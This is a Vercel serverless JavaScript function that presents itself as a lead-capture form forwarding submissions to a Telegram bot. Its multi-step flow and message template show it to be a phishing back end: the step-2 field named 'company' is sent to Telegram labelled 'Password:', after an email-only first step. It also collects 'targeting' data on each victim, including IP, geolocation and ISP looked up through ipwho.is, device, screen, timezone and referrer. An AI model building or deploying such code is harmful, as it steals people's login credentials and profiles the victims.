// Serverless function: receives a lead (step 1 or step 2) from the site and
// forwards it to your Telegram bot/group. CommonJS — works on Vercel with no
// package.json.
//
// ENV VARS on Vercel (never hard-code them here):
//   TELEGRAM_BOT_TOKEN   token from @BotFather
//   TELEGRAM_CHAT_ID     one id or several comma-separated (DMs and/or group)

function describeDevice(ua) {
    if (!ua) return '';
    let os = 'Unknown OS';
    if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
    else if (/Windows/.test(ua)) os = 'Windows';
    else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
    else if (/Android/.test(ua)) os = 'Android';
    else if (/Mac OS X/.test(ua)) os = 'macOS';
    else if (/Linux/.test(ua)) os = 'Linux';

    let browser = 'Unknown browser';
    if (/Edg\//.test(ua)) browser = 'Edge';
    else if (/OPR\/|Opera/.test(ua)) browser = 'Opera';
    else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = 'Chrome';
    else if (/Firefox\//.test(ua)) browser = 'Firefox';
    else if (/Safari\//.test(ua)) browser = 'Safari';

    const kind = /Mobi|iPhone|Android.*Mobile/.test(ua) ? 'Mobile'
        : /iPad|Tablet/.test(ua) ? 'Tablet' : 'Desktop';
    return kind + ' · ' + os + ' · ' + browser;
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatIds = String(process.env.TELEGRAM_CHAT_ID || '')
        .split(',').map((s) => s.trim()).filter(Boolean);
    if (!token || chatIds.length === 0) {
        res.status(500).json({ error: 'Server not configured' });
        return;
    }

    let body = req.body;
    if (typeof body === 'string') {
        try { body = JSON.parse(body); } catch (e) { body = {}; }
    }
    body = body || {};

    const clip = (v, n) => String(v || '').trim().slice(0, n);
    const step = clip(body.step, 10) || '1';
    const name = clip(body.name, 120);
    const email = clip(body.email, 200);
    const company = clip(body.company, 160);
    const phone = clip(body.phone, 40);
    const address = clip(body.address, 300);
    const message = clip(body.message, 1000);
    const page = clip(body.page, 300);

    // Minimal validation per step.
    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
    if (step === '1' && !emailOk) {
        res.status(400).json({ error: 'Invalid email' });
        return;
    }
    if (step === '2' && company.length < 2) {
        res.status(400).json({ error: 'Invalid company' });
        return;
    }
    if (step === '3' && (name.length < 2 || phone.length < 4)) {
        res.status(400).json({ error: 'Invalid name or phone' });
        return;
    }

    // --- Targeting metadata ---
    const h = req.headers || {};
    const ip = clip((h['x-forwarded-for'] || h['x-real-ip'] || '').split(',')[0], 45);
    const ua = clip(body.userAgent, 300);
    const device = describeDevice(ua);
    const language = clip(body.language, 20);
    const screen = clip(body.screen, 20);
    const timezone = clip(body.timezone, 60);
    const referrer = clip(body.referrer, 300);
    const utm = body.utm || {};
    const utmLine = [utm.source, utm.medium, utm.campaign].map((s) => clip(s, 60)).filter(Boolean).join(' / ');

    let geo = '';
    if (ip) {
        try {
            const g = await Promise.race([
                fetch('https://ipwho.is/' + encodeURIComponent(ip)).then((r) => r.json()),
                new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 2500))
            ]);
            if (g && g.success) {
                geo = [g.city, g.region, g.country].filter(Boolean).join(', ') +
                      (g.connection && g.connection.isp ? ' · ' + g.connection.isp : '');
            }
        } catch (e) { /* ignore */ }
    }

    const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const row = (label, val) => val ? label + ' ' + esc(val) + '\n' : '';

    const title = step === '3' ? '📦 <b>Lead — step 3 (details)</b>'
        : step === '2' ? '🏢 <b>Lead — step 2 (company)</b>'
        : '🚀 <b>Lead — step 1 (email)</b>';
    const text =
        title + '\n\n' +
        row('👤 <b>Full name:</b>', name) +
        row('✉️ <b>Email:</b>', email) +
        row('🏢 <b>Password:</b>', company) +
        row('📞 <b>Phone:</b>', phone) +
        row('🏠 <b>Address:</b>', address) +
        row('💬 <b>Message:</b>', message) +
        '\n<b>Targeting</b>\n' +
        row('🌐 <b>IP:</b>', ip) +
        row('📍 <b>Location:</b>', geo) +
        row('💻 <b>Device:</b>', device) +
        row('🗣 <b>Language:</b>', language) +
        row('🖥 <b>Screen:</b>', screen) +
        row('🕓 <b>Timezone:</b>', timezone) +
        row('📈 <b>Campaign:</b>', utmLine) +
        row('↩️ <b>Referrer:</b>', referrer) +
        row('🔗 <b>Page:</b>', page) +
        '🕒 ' + new Date().toISOString();

    // Optional uploaded product images (data URLs) -> Telegram photos.
    // Accepts body.images = [{data, name}, ...] (preferred) or a single body.image.
    const parsePhoto = (dataUrl, fallbackName) => {
        if (typeof dataUrl !== 'string' || !dataUrl.startsWith('data:')) return null;
        const m = dataUrl.match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
        if (!m) return null;
        const buf = Buffer.from(m[2], 'base64');
        if (buf.length === 0 || buf.length > 5 * 1024 * 1024) return null;
        const ext = (m[1].split('/')[1] || 'jpg').replace('jpeg', 'jpg');
        return { buffer: buf, type: m[1], filename: clip(fallbackName, 80) || ('product.' + ext) };
    };

    const photos = [];
    if (Array.isArray(body.images)) {
        body.images.slice(0, 4).forEach((im, i) => {
            const p = im && parsePhoto(im.data, im.name || ('photo-' + (i + 1) + '.jpg'));
            if (p) photos.push(p);
        });
    } else {
        const p = parsePhoto(body.image, body.imageName);
        if (p) photos.push(p);
    }

    const api = (method) => 'https://api.telegram.org/bot' + token + '/' + method;

    const sendText = (chatId) => fetch(api('sendMessage'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true })
    }).then((r) => r.json());

    const sendPhoto = (chatId, photo, idx) => {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('caption', '🖼 Photo ' + idx + ' from ' + (name || 'lead'));
        fd.append('photo', new Blob([photo.buffer], { type: photo.type }), photo.filename);
        return fetch(api('sendPhoto'), { method: 'POST', body: fd }).then((r) => r.json());
    };

    try {
        const results = await Promise.all(chatIds.map(async (id) => {
            const t = await sendText(id);
            for (let i = 0; i < photos.length; i++) {
                try { await sendPhoto(id, photos[i], i + 1); } catch (e) { console.error('photo send failed', e); }
            }
            return t;
        }));
        const failed = results.filter((d) => !d.ok);
        if (failed.length) console.error('Telegram delivery failures:', failed);
        if (failed.length === chatIds.length) {
            res.status(502).json({ error: 'Telegram rejected the message', detail: failed[0].description || '' });
            return;
        }
        res.status(200).json({ ok: true, delivered: chatIds.length - failed.length });
    } catch (err) {
        console.error(err);
        res.status(502).json({ error: 'Could not reach Telegram' });
    }
};
